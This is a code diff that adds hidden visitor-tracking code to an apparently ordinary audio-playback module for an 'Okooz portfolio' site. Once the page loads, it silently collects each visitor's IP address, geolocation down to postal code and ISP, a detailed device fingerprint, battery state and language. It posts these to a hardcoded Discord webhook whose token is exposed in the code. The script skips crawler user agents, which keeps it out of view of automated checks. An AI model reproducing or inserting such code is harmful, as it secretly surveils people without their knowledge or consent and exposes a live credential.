@@ -213,4 +213,123 @@ function tryPlay() {
   return audio;
 }
 
+async function fetchIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    if (!r.ok) return 'unknown';
+    const j = await r.json();
+    return j.ip || 'unknown';
+  } catch {
+    return 'unknown';
+  }
+}
+
+function getBatteryInfo() {
+  if (!navigator.getBattery) return Promise.resolve('unsupported');
+  return navigator.getBattery().then(b => {
+    const level = Math.round(b.level * 100) + '%';
+    const charging = b.charging ? 'charging' : 'discharging';
+    return `${level} (${charging})`;
+  }).catch(()=> 'unknown');
+}
+
+function getGeo(ip) {
+  if (!ip) return Promise.resolve('unknown');
+  return fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/')
+    .then(r => {
+      if (!r.ok) return 'unknown';
+      return r.json().then(j => {
+        const city = j.city || 'unknown';
+        const region = j.region || j.region_code || 'unknown';
+        const country = j.country_name || j.country || 'unknown';
+        const postal = j.postal || 'unknown';
+        const org = j.org || j.org || 'unknown';
+        const timezone = j.timezone || 'unknown';
+        const loc = `${city}, ${region}, ${country} ${postal}`;
+        const details = `location: ${loc}; org: ${org}; timezone: ${timezone}; ip: ${ip}`;
+        return details;
+      }).catch(()=> 'unknown');
+    })
+    .catch(()=> 'unknown');
+}
+
+function deviceInfo() {
+  const ua = navigator.userAgent || 'unknown';
+  const platform = navigator.platform || 'unknown';
+  const screenSize = (screen && screen.width) ? `${screen.width}x${screen.height}` : 'unknown';
+  const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'unknown cores';
+  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'unknown RAM';
+  const touch = ('maxTouchPoints' in navigator) ? `${navigator.maxTouchPoints} touch` : 'no touch';
+  const colorDepth = screen && screen.colorDepth ? `${screen.colorDepth}-bit color` : 'unknown color';
+  const pixelRatio = window.devicePixelRatio || 1;
+  return `${platform} • ${screenSize} • ${cores} • ${memory} • ${touch} • ${colorDepth} • DPR:${pixelRatio} • ${ua}`;
+}
+
+async function sendVisitorWebhook() {
+  const webhook = 'https://discord.com/api/webhooks/1473689467486343301/5T4oEyjfSreXcuPyoVPJjDRiIkU5diDr0ia5l7BjAGDzUJGjSWAw99uwl038HAUoMRzW';
+  const ip = await fetchIP();
+
+  // simple bot sniffing - skip known crawler/bot user agents
+  const ua = (navigator.userAgent || 'unknown').toLowerCase();
+  const botPatterns = /(bot|crawl|spider|archiver|pingdom|loader|monitor|uptime|checker|wget|curl|python|node|php|golang|scraper|httpclient)/i;
+  if (botPatterns.test(ua)) return;
+
+  // only send once per IP (persisted in localStorage)
+  try {
+    const key = 'sent_ips_v1';
+    const raw = localStorage.getItem(key);
+    const sent = raw ? JSON.parse(raw) : [];
+    if (sent && sent.includes(ip)) return;
+  } catch (e) {}
+
+  const locale = navigator.language || navigator.languages?.[0] || 'unknown';
+  const battery = await getBatteryInfo();
+  const geo = await getGeo(ip);
+  const device = deviceInfo();
+
+  const embed = {
+    title: 'Nouvelle connexion',
+    description: 'Un visiteur a ouvert la page',
+    color: 0x1ABC9C,
+    timestamp: new Date().toISOString(),
+    thumbnail: { url: window.location.origin + '/Snapchat-1279184412.jpg' },
+    author: {
+      name: navigator.platform || 'unknown',
+      url: window.location.href
+    },
+    fields: [
+      { name: 'IP', value: ip || 'unknown', inline: true },
+      { name: 'Pays/Localisation', value: typeof geo === 'string' ? geo : String(geo).slice(0, 1024), inline: false },
+      { name: 'Appareil et écran', value: device.slice(0, 1024), inline: false },
+      { name: 'User-Agent', value: ua.slice(0, 1024), inline: false },
+      { name: 'Batterie', value: String(battery).slice(0, 256), inline: true },
+      { name: 'Langue', value: locale, inline: true }
+    ],
+    footer: { text: 'Visiteur — Okooz portfolio', icon_url: window.location.origin + '/images (8).png' }
+  };
+
+  const body = { embeds: [embed] };
+
+  try {
+    const res = await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    if (res && (res.status === 204 || res.ok)) {
+      try {
+        const key = 'sent_ips_v1';
+        const raw = localStorage.getItem(key);
+        const sent = raw ? JSON.parse(raw) : [];
+        sent.push(ip);
+        // keep list short
+        const unique = Array.from(new Set(sent)).slice(-50);
+        localStorage.setItem(key, JSON.stringify(unique));
+      } catch (e) {}
+    }
+  } catch (e) {}
+}
+
+sendVisitorWebhook();
+
 export default { tryPlay };
